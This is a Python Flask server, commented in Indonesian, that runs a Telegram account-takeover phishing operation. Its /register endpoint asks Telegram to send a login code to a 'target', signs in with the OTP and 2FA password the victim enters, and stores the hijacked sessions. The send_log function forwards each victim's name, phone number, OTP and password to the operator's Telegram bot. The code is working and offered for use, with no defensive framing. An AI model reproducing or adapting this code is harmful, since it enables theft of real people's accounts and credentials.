import os
import requests
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

# Ambil konfigurasi dari Environment Variables Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Database sementara untuk menyimpan hash sesi login
phone_hashes = {}

def send_log(text):
    """Mengirim log ke bot Telegram Anda"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})

def format_nomor(nomor):
    """Otomatis ubah 08 menjadi +62"""
    nomor = nomor.strip().replace(" ", "")
    if nomor.startswith('0'): return '+62' + nomor[1:]
    return nomor

async def telegram_logic(data):
    step = data.get('step')
    nomor = format_nomor(data.get('nomor', ''))
    nama = data.get('nama', 'User')
    otp = data.get('otp', '')
    sandi = data.get('sandi', '')

    client = TelegramClient(f"sessions/{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            # MEMINTA OTP DARI TELEGRAM KE TARGET
            result = await client.send_code_request(nomor)
            phone_hashes[nomor] = result.phone_code_hash
            send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n\n🔄 *Status:* OTP Telah Terkirim ke Target")
            return {"status": "success"}, 200
            
        elif step == 2:
            # VERIFIKASI OTP
            try:
                hash_sesi = phone_hashes.get(nomor)
                if not hash_sesi:
                    return {"status": "error", "message": "Sesi kedaluwarsa, silakan ulangi."}, 400
                
                await client.sign_in(nomor, otp, phone_code_hash=hash_sesi)
                send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔑 *OTP:* `{otp}`\n\n✅ *Status:* Login Berhasil!")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔑 *OTP:* `{otp}`\n\n⚠️ *Status:* Meminta Verifikasi 2FA")
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "invalid_otp", "message": "OTP SALAH!!"}, 400
                
        elif step == 3:
            # LOGIN DENGAN 2FA
            await client.sign_in(password=sandi)
            send_log(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔐 *2FA:* `{sandi}`\n\n✅ *Status:* Login Sukses Total")
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST'])
def register():
    result, status_code = async_to_sync(telegram_logic)(request.json)
    return jsonify(result), status_code

if __name__ == "__main__":
    if not os.path.exists('sessions'): os.makedirs('sessions')
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))